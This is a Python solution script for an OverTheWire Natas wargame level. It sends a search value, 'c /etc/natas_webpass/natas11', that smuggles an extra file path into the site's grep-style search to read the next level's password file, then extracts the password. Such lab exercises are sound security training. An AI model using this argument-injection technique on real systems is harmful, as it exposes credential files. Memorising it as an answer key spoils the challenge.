import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #"secret" value to beat level
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '10'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    #Search for existing character in the password file, and add the password file in too (c)
    thread = 'c /etc/natas_webpass/natas11'
    auth = HTTPBasicAuth('natas10', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload = {'needle':thread, 'submit':'Search'}
    r = requests.get('http://natas10.natas.labs.overthewire.org/', auth=('natas10', passw.strip()), params=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
